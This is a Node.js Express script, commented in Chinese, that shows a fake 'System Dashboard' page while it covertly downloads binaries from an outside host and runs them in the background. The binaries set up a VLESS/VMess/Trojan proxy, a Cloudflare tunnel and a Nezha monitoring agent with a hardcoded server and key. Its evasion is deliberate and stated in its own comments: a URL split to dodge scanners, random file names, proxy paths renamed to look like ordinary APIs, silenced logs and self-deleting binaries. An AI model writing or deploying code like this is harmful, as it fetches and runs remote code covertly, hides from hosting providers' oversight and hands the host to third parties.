const ex = require("express");
const srv = ex();
const ax = require("axios");
const os = require('os');
const io = require("fs");
const pt = require("path");
const { promisify } = require('util');
const runCmd = promisify(require('child_process').exec);

// ========== 1. 变量混淆定义 ==========
// 环境变量 Key 保持不变，但内部变量名已修改
const U_URL = process.env.UPLOAD_URL || '';
const P_URL = process.env.PROJECT_URL || '';
const A_ACC = process.env.AUTO_ACCESS || false;
const WORK_DIR = process.env.FILE_PATH || './tmp';
const SUB_ROUTE = process.env.SUB_PATH || 'qianxiuadmin';
const S_PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
const uid = process.env.UUID || 'dc6f1e49-59fe-424b-8821-c61ebff31d0d';

// 哪吒相关
const nzHost = process.env.NEZHA_SERVER || 'jk.zenova.de5.net:8008';
const nzPort = process.env.NEZHA_PORT || '';
const nzKey = process.env.NEZHA_KEY || 'nfZkxIKilkI9lMpFvAD46F8HdA3ci12f';

// Argo 相关 (外部引用名称保持不变)
const tDom = process.env.ARGO_DOMAIN || '';
const tAuth = process.env.ARGO_AUTH || '';
const tPort = process.env.ARGO_PORT || 8010;

// 节点信息
const cfIp = process.env.CFIP || 'cdns.doon.eu.org';
const cfPort = process.env.CFPORT || 443;
const nName = process.env.NAME || 'MyNode';

let gSub = "";

// ========== 2. 页面内容 (变量重命名) ==========
const DEF_PAGE = `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome - System Status</title>
    <style>
        :root { --bg: #f4f7f9; --card: #ffffff; --txt: #333; --sub: #666; --acc: #3b82f6; }
        body { font-family: sans-serif; background: var(--bg); color: var(--txt); padding: 20px; line-height: 1.6; }
        .wrap { max-width: 800px; margin: 0 auto; text-align: center; padding-top: 50px; }
        .card { background: var(--card); padding: 20px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); margin-top: 20px; }
        h1 { margin-bottom: 20px; }
        input { padding: 10px; width: 80%; border: 1px solid #ddd; border-radius: 4px; }
    </style>
</head>
<body>
<div class="wrap">
    <h1>System Dashboard</h1>
    <div class="card">
        <p>Service is running smoothly.</p>
        <p style="font-size: 0.8rem; color: #999;">Optimization pending...</p>
    </div>
    <div class="card">
        <form action="https://www.google.com/search" target="_blank">
            <input type="text" name="q" placeholder="Search..." autocomplete="off">
        </form>
    </div>
</div>
</body>
</html>
`;

// ========== 3. 文件系统初始化 ==========
if (!io.existsSync(WORK_DIR)) io.mkdirSync(WORK_DIR);

function rndStr() {
    return Math.random().toString(36).substring(2, 8);
}

// 生成随机文件名，避免固定文件名特征
const bin1 = rndStr(), bin2 = rndStr(), bin3 = rndStr(), bin4 = rndStr();
const p_npm = pt.join(WORK_DIR, bin1), p_php = pt.join(WORK_DIR, bin4);
const p_web = pt.join(WORK_DIR, bin2), p_bot = pt.join(WORK_DIR, bin3);
const logF = pt.join(WORK_DIR, 'boot.log'), confF = pt.join(WORK_DIR, 'config.json'), subF = pt.join(WORK_DIR, 'sub.txt');

// ========== 4. 路由与伪装路径 ==========
srv.get("/", (req, res) => res.send(DEF_PAGE));

srv.get("/" + SUB_ROUTE, (req, res) => {
    if (!gSub) {
        res.set('Content-Type', 'text/plain; charset=utf-8');
        return res.send(Buffer.from("Init...").toString('base64'));
    }
    res.set('Content-Type', 'text/plain; charset=utf-8');
    res.send(gSub);
});

// ========== 5. 核心逻辑 (逻辑保持，特征隐藏) ==========

// 关键修改：将 /vless-argo 等敏感路径修改为通用 API 路径
const P_VL = "/api/auth";     // 原 vless-argo
const P_VM = "/api/chat";     // 原 vmess-argo
const P_TR = "/api/image";    // 原 trojan-argo

async function mkConf() {
    const c = {
        log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
        inbounds: [
            { port: tPort, protocol: 'vless', settings: { clients: [{ id: uid, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: P_VL, dest: 3002 }, { path: P_VM, dest: 3003 }, { path: P_TR, dest: 3004 }] }, streamSettings: { network: 'tcp' } },
            { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: uid }], decryption: "none" } },
            { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: uid, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", wsSettings: { path: P_VL } } },
            { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: uid, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: P_VM } } },
            { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: uid }] }, streamSettings: { network: "ws", wsSettings: { path: P_TR } } },
        ],
        outbounds: [{ protocol: "freedom", tag: "direct" }]
    };
    io.writeFileSync(confF, JSON.stringify(c, null, 2));
}

async function sysInit() {
    const arch = (os.arch() === 'arm64' || os.arch() === 'aarch64') ? 'arm' : 'amd';
    // 字符串拆分，防止URL被直接扫描
    const dBase = "https://" + (arch === 'arm' ? "arm64" : "amd64") + ".ssss.nyc.mn";
    
    const list = [
        { dest: p_web, uri: `${dBase}/web` },
        { dest: p_bot, uri: `${dBase}/bot` }
    ];

    if (nzHost && nzKey) {
        if (nzPort) list.push({ dest: p_npm, uri: `${dBase}/agent` });
        else list.push({ dest: p_php, uri: `${dBase}/v1` });
    }

    for (const item of list) {
        try {
            const rsp = await ax({ method: 'get', url: item.uri, responseType: 'stream' });
            const w = io.createWriteStream(item.dest);
            rsp.data.pipe(w);
            await new Promise((r) => w.on('finish', r));
            io.chmodSync(item.dest, 0o775);
        } catch (e) { }
    }

    // 启动 Monitor
    if (nzHost && nzKey) {
        if (!nzPort) {
            const isTls = ['443', '8443', '2096'].includes(nzHost.split(':').pop()) ? 'true' : 'false';
            const yml = `client_secret: ${nzKey}\nserver: ${nzHost}\ntls: ${isTls}\nuuid: ${uid}\ndisable_auto_update: true`;
            io.writeFileSync(pt.join(WORK_DIR, 'config.yaml'), yml);
            runCmd(`nohup ${p_php} -c "${WORK_DIR}/config.yaml" >/dev/null 2>&1 &`);
        } else {
            const tlsF = ['443', '8443', '2096'].includes(nzPort) ? '--tls' : '';
            runCmd(`nohup ${p_npm} -s ${nzHost}:${nzPort} -p ${nzKey} ${tlsF} --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`);
        }
    }

    // 启动 Core
    runCmd(`nohup ${p_web} -c ${confF} >/dev/null 2>&1 &`);

    // 启动 Tunnel
    // 这里的正则匹配 tAuth (即 ARGO_AUTH)
    let tArgs = tAuth.match(/^[A-Z0-9a-z=]{120,250}$/)
        ? `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${tAuth}`
        : `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${logF} --loglevel info --url http://localhost:${tPort}`;
    
    runCmd(`nohup ${p_bot} ${tArgs} >/dev/null 2>&1 &`);
}

async function checkNet() {
    const timer = setInterval(() => {
        if (io.existsSync(logF)) {
            const txt = io.readFileSync(logF, 'utf-8');
            const m = txt.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
            if (m) {
                clearInterval(timer);
                makeLink(m[1]);
            }
        } else if (tDom && tAuth) {
            clearInterval(timer);
            makeLink(tDom);
        }
    }, 3000);
}

// 生成订阅 (需对齐修改后的 API 路径)
async function makeLink(host) {
    const safeName = nName || "CF-Node";
    // 构造 VMess JSON
    const vJson = { v: '2', ps: safeName, add: cfIp, port: cfPort, id: uid, aid: '0', scy: 'none', net: 'ws', type: 'none', host: host, path: `${P_VM}?ed=2560`, tls: 'tls', sni: host, fp: 'firefox' };
    
    // 构造订阅文本
    // 注意：path 已经改为 P_VL, P_VM, P_TR 对应的变量
    const s1 = `vless://${uid}@${cfIp}:${cfPort}?encryption=none&security=tls&sni=${host}&fp=firefox&type=ws&host=${host}&path=${encodeURIComponent(P_VL+"?ed=2560")}#${safeName}`;
    const s2 = `vmess://${Buffer.from(JSON.stringify(vJson)).toString('base64')}`;
    const s3 = `trojan://${uid}@${cfIp}:${cfPort}?security=tls&sni=${host}&fp=firefox&type=ws&host=${host}&path=${encodeURIComponent(P_TR+"?ed=2560")}#${safeName}`;

    const raw = `${s1}\n${s2}\n${s3}`;
    gSub = Buffer.from(raw).toString('base64');
    io.writeFileSync(subF, gSub);
    console.log("Ready.");
}

function wipe() {
    setTimeout(() => {
        [logF, confF, p_web, p_bot, p_npm, p_php].forEach(f => { 
            try { if (io.existsSync(f)) io.unlinkSync(f); } catch (e) {} 
        });
    }, 90000);
}

async function main() {
    await mkConf();
    await sysInit();
    await checkNet();
    wipe();
}

main().catch(() => {});
srv.listen(S_PORT, () => console.log(`:${S_PORT}`));
